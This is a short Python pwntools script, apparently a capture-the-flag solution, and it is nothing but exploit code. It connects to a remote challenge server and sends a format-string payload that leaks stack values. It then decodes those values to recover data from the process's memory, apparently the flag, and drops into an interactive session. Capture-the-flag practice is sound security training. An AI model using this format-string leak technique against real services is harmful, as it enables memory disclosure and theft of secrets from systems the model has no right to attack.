from pwn import *  
import codecs

context.arch='amd64'

# cn = process("./bin")
cn = remote("mc.ax", 31569)


# gdb.attach(cn, 'b * $rebase(0x0000000000001274)')

payload = flat("pleaseaa%70$p%71$p%72$p%73$p%74$p0x")
cn.sendline(payload)
a = cn.recvuntil('0x')[:-2]
a0 = codecs.decode(cn.recvuntil('0x')[:-2], 'hex')[::-1]
a0 += codecs.decode(cn.recvuntil('0x')[:-2], 'hex')[::-1]
a0 += codecs.decode(cn.recvuntil('0x')[:-2], 'hex')[::-1]
a0 += codecs.decode(cn.recvuntil('0x')[:-2], 'hex')[::-1]
a0 += codecs.decode(cn.recvuntil('0x')[1:-2], 'hex')[::-1]
print(a0)

cn.interactive()

